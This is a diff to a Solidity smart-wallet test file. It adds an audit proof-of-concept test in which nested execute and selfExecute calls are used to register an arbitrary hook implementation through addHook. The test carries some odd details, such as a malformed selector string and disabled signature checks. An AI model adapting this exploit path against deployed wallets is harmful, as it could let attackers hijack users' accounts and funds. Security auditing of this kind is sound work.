@@ -9,6 +9,7 @@ import { AdvTest } from "../utils/TestUtils.sol";
 import { Payload } from "../../src/modules/Payload.sol";
 
 import { PrimitivesRPC } from "../utils/PrimitivesRPC.sol";
+import {Stage1Module} from '../../src/Stage1Module.sol';
 
 contract CallsImp is Calls {
 
@@ -196,6 +197,113 @@ contract CallsTest is AdvTest {
         assertEq(totalTransferred, decoded.calls[i].to.balance);
       }
     }
+  }
+
+//@audit-poc
+  function test_execute_REentrancy(bytes32 _opHash, CallsPayload memory _payload1, CallsPayload memory _payload2, bytes calldata _signature) external {
+    vm.assume(_payload1.calls.length == 1);
+    vm.assume(_payload2.calls.length == 1);
+    address factory  = makeAddr("factory");
+    address entryPoint = makeAddr("entryPoint");
+    bytes4 selector = bytes4(bytes("transfer(address, to)"));
+    address implementationAddress = makeAddr("implementation");
+
+    Stage1Module stage1Module = new Stage1Module(factory,entryPoint);
+    bytes memory innerSelfExecuteCalldata = abi.encodeCall(stage1Module.addHook, (selector, implementationAddress));
+
+    _payload2.calls[0] = Payload.Call({
+     to: address(calls),
+     value: 0, 
+     data: innerSelfExecuteCalldata,
+     gasLimit: 1000000,
+     delegateCall: false,
+     onlyFallback: false,
+    behaviorOnError: 0x01
+    });
+
+    Payload.Decoded memory decoded2 = toDecodedPayload(_payload2);
+
+    preparePayload(decoded2);
+    boundToLegalPayload(decoded2);
+
+    bytes memory packed2 = PrimitivesRPC.toPackedPayload(vm, decoded2);
+
+    bytes memory outerSelfExecuteCalldata = abi.encodeCall(calls.selfExecute, (packed2));
+   
+    _payload1.calls[0] = Payload.Call({
+     to: address(calls),
+     value: 0, 
+     data: outerSelfExecuteCalldata,
+     gasLimit: 1000000,
+     delegateCall: false,
+     onlyFallback: false,
+     behaviorOnError: 0x01
+
+    });
+    address mockDelegatecall = address(new MockDelegatecall());
+    Payload.Decoded memory decoded1 = toDecodedPayload(_payload1);
+
+    preparePayload(decoded1);
+    boundToLegalPayload(decoded1);
+
+    bytes memory packed1 = PrimitivesRPC.toPackedPayload(vm, decoded1);
+    // calls.setExpectedSignature(_signature);
+    // calls.setExpectedOpHash(_opHash);
+    calls.writeNonce(decoded1.space, decoded1.nonce);
+
+    for (uint256 i = 0; i < decoded1.calls.length; i++) {
+      if (decoded1.calls[i].onlyFallback) {
+        vm.expectEmit(true, true, true, true, address(calls));
+        emit CallSkipped(_opHash, i);
+      } else {
+        vm.deal(decoded1.calls[i].to, 0);
+
+        if (decoded1.calls[i].delegateCall) {
+          vm.etch(decoded1.calls[i].to, mockDelegatecall.code);
+          vm.expectEmit(true, true, true, true, address(calls));
+          emit MockDelegatecall.OpHash(_opHash);
+          // Can't test gasleft() because memory expansion makes it not so reliable
+          // emit MockDelegatecall.StartingGas(gasleft());
+          vm.expectEmit(true, true, true, true, address(calls));
+          emit MockDelegatecall.Index(i);
+          vm.expectEmit(true, true, true, true, address(calls));
+          emit MockDelegatecall.NumCalls(decoded1.calls.length);
+          vm.expectEmit(true, true, true, true, address(calls));
+          emit MockDelegatecall.Space(decoded1.space);
+          vm.expectEmit(true, true, true, true, address(calls));
+          emit MockDelegatecall.Data(decoded1.calls[i].data);
+        } else {
+          vm.expectCall(decoded1.calls[i].to, decoded1.calls[i].data);
+        }
+
+        emit CallSucceeded(_opHash, i);
+      }
+    }
+
+    calls.execute(packed1, _signature);
+    assertEq(stage1Module.readHook(selector), implementationAddress, "Mismatch happened");
+
+    // assertEq(address(calls).balance, 0);
+
+    // Assert balance of each destination contract
+    // for (uint256 i = 0; i < decoded.calls.length; i++) {
+    //   if (
+    //     !decoded.calls[i].delegateCall && decoded.calls[i].to.balance != decoded.calls[i].value
+    //       && !decoded.calls[i].onlyFallback
+    //   ) {
+    //     // We need to do a full recount because maybe the contract is duplicated so multiple transfers are done
+    //     uint256 totalTransferred = 0;
+    //     for (uint256 j = 0; j < decoded.calls.length; j++) {
+    //       if (
+    //         !decoded.calls[j].delegateCall && decoded.calls[j].to == decoded.calls[i].to
+    //           && !decoded.calls[j].onlyFallback
+    //       ) {
+    //         totalTransferred += decoded.calls[j].value;
+    //       }
+    //     }
+    //     assertEq(totalTransferred, decoded.calls[i].to.balance);
+    //   }
+    // }
   }
 
   function test_self_execute(
